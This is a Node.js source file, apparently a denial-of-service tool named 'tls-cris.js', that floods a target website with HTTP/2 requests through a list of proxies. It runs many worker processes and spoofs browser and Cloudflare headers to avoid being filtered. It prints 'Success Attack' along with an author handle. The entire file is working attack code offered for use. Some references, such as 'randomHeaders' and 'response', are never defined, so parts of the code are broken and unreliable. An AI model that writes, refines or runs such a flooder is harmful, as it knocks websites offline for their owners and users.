const net = require("net");
 const http2 = require("http2");
 const tls = require("tls");
 const cluster = require("cluster");
 const url = require("url");
 const scp = require("set-cookie-parser");
 const crypto = require("crypto");
 const UserAgent = require('user-agents');
 const fs = require("fs");
 var colors = require("colors");
 const { HeaderGenerator } = require('header-generator');

 process.setMaxListeners(0);
 require("events").EventEmitter.defaultMaxListeners = 0;
 process.on('uncaughtException', function (exception) {
  });

 if (process.argv.length < 7){console.log(`Usage: node tls-cris.js target time rate thread proxyfile`); process.exit();}
 const headers = {};
  function readLines(filePath) {
     return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
 }
 
 function randomIntn(min, max) {
     return Math.floor(Math.random() * (max - min) + min);
 }
 
 function randomElement(elements) {
     return elements[randomIntn(0, elements.length)];
 } 
 
 const args = {
     target: process.argv[2],
     time: ~~process.argv[3],
     Rate: ~~process.argv[4],
     threads: ~~process.argv[5],
     proxyFile: process.argv[6]
 };
 dest_header = [
    'audio',
    'audioworklet',
    'document',
    'embed',
    'empty',
    'font',
    'frame',
    'iframe',
    'image',
    'manifest',
    'object',
    'paintworklet',
    'report',
    'script',
    'serviceworker',
    'sharedworker',
    'style',
    'track',
    'video',
    'worker',
    'xslt'
],
type = [
    "text/plain",
    "text/html",
    "application/json",
    "application/xml",
    "multipart/form-data",
    "application/octet-stream",
    "image/jpeg",
    "image/png",
    "audio/mpeg",
    "video/mp4",
    "application/javascript",
    "application/pdf",
    "application/vnd.ms-excel",
    "application/vnd.ms-powerpoint",
    "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
    "application/vnd.openxmlformats-officedocument.presentationml.presentation",
    "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
    "application/zip",
    "image/gif",
    "image/bmp",
    "image/tiff",
    "audio/wav",
    "audio/midi",
    "video/avi",
    "video/mpeg",
    "video/quicktime",
    "text/csv",
    "text/xml",
    "text/css",
    "text/javascript",
    "application/graphql",
    "application/x-www-form-urlencoded",
    "application/vnd.api+json",
    "application/ld+json",
    "application/x-pkcs12",
    "application/x-pkcs7-certificates",
    "application/x-pkcs7-certreqresp",
    "application/x-pem-file",
    "application/x-x509-ca-cert",
    "application/x-x509-user-cert",
    "application/x-x509-server-cert",
    "application/x-bzip",
    "application/x-gzip",
    "application/x-7z-compressed",
    "application/x-rar-compressed",
    "application/x-shockwave-flash"
  ];
cache_header = [
    'max-age=0',
    'no-cache',
    'no-store', 
    'pre-check=0',
    'post-check=0',
    'must-revalidate',
    'proxy-revalidate',
    's-maxage=604800',
    'no-cache, no-store,private, max-age=0, must-revalidate',
    'no-cache, no-store,private, s-maxage=604800, must-revalidate',
    'no-cache, no-store,private, max-age=604800, must-revalidate',
],
mode_header = [
    'cors',
    'navigate',
    'no-cors',
    'same-origin',
    'websocket'
],
site_header = [
    'cross-site',
    'same-origin',
    'same-site',
    'none'
]
 var proxies = readLines(args.proxyFile);
 const parsedTarget = url.parse(args.target);

 let headerGenerator = new HeaderGenerator({
     browsers: [
         {name: "firefox", minVersion: 100, httpVersion: "2"},
     ],
     devices: [
         "desktop",
     ],
     operatingSystems: [
         "windows",
     ],
     locales: ["en-US", "en"]
 });

 if (cluster.isMaster) {
    for (let counter = 1; counter <= args.threads; counter++) {
        console.clear()
        console.log('Success Attack'.bgRed);
console.log('@Bettercallcrisxtop | NEW TLS METHODS'.yellow);
        cluster.fork();
    }
} else {setInterval(runFlooder) }
 
 class NetSocket {
     constructor(){}
 
  HTTP(options, callback) {
     const parsedAddr = options.address.split(":");
     const addrHost = parsedAddr[0];
     const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
     const buffer = new Buffer.from(payload);
 
     const connection = net.connect({
         host: options.host,
         port: options.port
     });
 
     connection.setTimeout(options.timeout * 100000);
     connection.setKeepAlive(true, 100000);
 
     connection.on("connect", () => {
        connection.write(buffer);
    });
     connection.on("data", chunk => {
        const response = chunk.toString("utf-8");
        const isAlive = response.includes("HTTP/1.1 200");
        if (isAlive === false) {
            connection.destroy();
            return callback(undefined, "403");
        }
        return callback(connection, undefined);
    });

    connection.on("timeout", () => {
        connection.destroy();
        return callback(undefined, "403");
    });

    connection.on("error", error => {
        connection.destroy();
        return callback(undefined, "403");
    });
}
}
 function getRandomUserAgent() {
    const osList = ['Windows', 'Windows NT 10.0', 'Windows NT 6.1', 'Windows NT 6.3', 'Macintosh', 'Android', 'Linux'];
    const browserList = ['Chrome', 'Firefox', 'Safari', 'Edge', 'Opera'];
    const languageList = ['en-US', 'en-GB', 'fr-FR', 'de-DE', 'es-ES'];
    const countryList = ['US', 'GB', 'FR', 'DE', 'ES'];
    const manufacturerList = ['Windows', 'Apple', 'Google', 'Microsoft', 'Mozilla', 'Opera Software'];
    const os = osList[Math.floor(Math.random() * osList.length)];
    const browser = browserList[Math.floor(Math.random() * browserList.length)];
    const language = languageList[Math.floor(Math.random() * languageList.length)];
    const country = countryList[Math.floor(Math.random() * countryList.length)];
    const manufacturer = manufacturerList[Math.floor(Math.random() * manufacturerList.length)];
    const version = Math.floor(Math.random() * 100) + 1;
    const randomOrder = Math.floor(Math.random() * 6) + 1;
    const userAgentString = `${manufacturer}/${browser} ${version}.${version}.${version} (${os}; ${country}; ${language})`;
    const encryptedString = btoa(userAgentString);
    let finalString = '';
    for (let i = 0; i < encryptedString.length; i++) {
      if (i % randomOrder === 0) {
        finalString += encryptedString.charAt(i);
      } else {
        finalString += encryptedString.charAt(i).toUpperCase();
      }
    }
    return finalString;
  }
  function cookieString(cookie) {
    var s = "";
    for (var c in cookie) {
      s = `${s} ${cookie[c].name}=${cookie[c].value};`;
    }
    var s = s.substring(1);
    return s.substring(0, s.length - 1);
  }

  const Header = new NetSocket();
headers[":method"] = "GET";
headers[":path"] = parsedTarget.path;
headers[":scheme"] = "https";
headers["GET"] = " / HTTP/2";
headers["accept"] = randomHeaders['accept'];
headers["referer"] = "https://" + parsedTarget.host + parsedTarget.path;
headers["content-type"] = type[Math.floor(Math.random() * type.length)];
headers["sec-fetch-user"] = "?1";
headers["cache-control"] = cache_header[Math.floor(Math.random() * cache_header.length)];
headers["sec-fetch-dest"] = dest_header[Math.floor(Math.random() * dest_header.length)];
headers["sec-fetch-mode"]= mode_header[Math.floor(Math.random() * mode_header.length)];
headers["sec-fetch-site"]= site_header[Math.floor(Math.random() * site_header.length)];
headers["accept-language"] = randomHeaders['accept-language'];
headers["accept-encoding"] = "gzip, deflate";
headers["Connection"] = "keep-alive";
headers["upgrade-insecure-requests"] = "1";
headers["TE"] = "trailers";
headers["cdn-loop"] = "cloudflare";
headers["expect-ct"] = "enforce";
headers["x-requested-with"] = "XMLHttpRequest";
headers["pragma"] =  "no-cache";
headers['cookie'] = cookieString(scp.parse(response["set-cookie"]));

 
 
 function runFlooder() {
     const proxyAddr = randomElement(proxies);
     const parsedProxy = proxyAddr.split(":");
     const userAgentv2 = new UserAgent();
     var useragent = userAgentv2.toString();
     headers[":authority"] = parsedTarget.host
     headers["user-agent"] = getRandomUserAgent();
 
     const proxyOptions = {
         host: parsedProxy[0],
         port: ~~parsedProxy[1],
         address: parsedTarget.host + ":443",
         timeout: 100
     };

     Header.HTTP(proxyOptions, (connection, error) => {
         if (error) return
 
         connection.setKeepAlive(true, 60000);

         const tlsOptions = {
            ALPNProtocols: ['h2'],
            followAllRedirects: true,
            challengeToSolve: 5,
            clientTimeout: 15000,
            clientlareMaxTimeout: 10000,
            echdCurve: "GREASE:X25519:x25519",
            ciphers: "TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA",
            rejectUnauthorized: false,
            socket: connection,
            decodeEmails: false,
            honorCipherOrder: true,
            requestCert: true,
            secure: true,
            port: 443,
            uri: parsedTarget.host,
            servername: parsedTarget.host,
        };

         const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions); 

         tlsConn.setKeepAlive(true, 60 * 1000);
 
         const client = http2.connect(parsedTarget.href, {
            protocol: "https:",
            settings: {
                headerTableSize: 65535
                , maxConcurrentStreams:  Math.random() < 0.5 ? 100 : 1000
                , initialWindowSize: 6291456
                , maxHeaderListSize: 262144
                , enablePush: Math.random() < 0.5 ? true : false,
               },
            maxSessionMemory: 3333,
            maxDeflateDynamicTableSize: 4294967295,
            createConnection: () => tlsConn,
            socket: connection,
        });

        client.settings({
            headerTableSize: 65536,
            maxConcurrentStreams: 100,
            initialWindowSize: 6291456,
            maxHeaderListSize: 262144,
            enablePush: false
        });

        
 
         client.on("connect", () => {
            const IntervalAttack = setInterval(() => {
                for (let i = 0; i < args.Rate; i++) {
                    const request = client.request(headers)
                    
                    .on("response", response => {
                        request.close();
                        request.destroy();
                        return
                    });
    
                    request.end();
                }
            }, 1000); 
         });
 
         client.on("close", () => {
             client.destroy();
             connection.destroy();
             return
         });
 
         client.on("error", error => {
             client.destroy();
             connection.destroy();
             return
         });
     });
 }
 
 const KillScript = () => process.exit(1);
 
 setTimeout(KillScript, args.time * 1000);